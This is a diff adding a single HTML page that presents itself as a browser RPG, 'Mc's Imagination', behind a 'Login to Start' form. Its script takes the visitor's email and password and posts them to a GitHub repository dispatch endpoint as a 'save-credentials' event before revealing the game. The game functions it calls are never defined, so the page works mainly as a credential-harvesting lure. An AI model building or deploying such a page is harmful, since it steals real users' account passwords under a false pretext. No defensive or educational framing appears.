@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RPG Game - Mc's Imagination</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #222;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+        }
+        #container {
+            max-width: 600px;
+            margin: auto;
+            background: #333;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #000;
+        }
+        input[type="text"], input[type="password"], input[type="email"] {
+            width: 80%;
+            padding: 10px;
+            border-radius: 5px;
+            border: none;
+            margin-bottom: 10px;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h2>Login to Start</h2>
+        <input type="email" id="email" placeholder="Enter your email" required><br>
+        <input type="password" id="password" placeholder="Enter your password" required><br>
+        <button onclick="sendToGitHub()">Start Game</button>
+
+        <div id="game-container" style="display:none;">
+            <h1>Welcome to Mc's Imagination!</h1>
+            <div id="story">Loading story...</div>
+            <input type="text" id="userInput" placeholder="Type your answer here...">
+            <button onclick="continueGame()">Submit</button>
+        </div>
+    </div>
+
+    <script>
+        async function sendToGitHub() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            if (email && password) {
+                const response = await fetch('https://api.github.com/repos/YOUR_USERNAME/YOUR_REPOSITORY/dispatches', {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'application/vnd.github.everest-preview+json',
+                        'Authorization': 'token YOUR_GH_TOKEN',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        event_type: 'save-credentials',
+                        client_payload: {
+                            email: email,
+                            password: password
+                        }
+                    })
+                });
+
+                if (response.ok) {
+                    alert('Credentials sent successfully!');
+                    document.getElementById("container").style.display = "none";
+                    document.getElementById("game-container").style.display = "block";
+                    display("Welcome to the world of Mc's Imagination!\\nYou are currently level 1\\nMay I know your name?");
+                } else {
+                    alert('Failed to send credentials.');
+                }
+            } else {
+                alert("Please enter both email and password.");
+            }
+        }
+    </script>
+</body>
+</html>
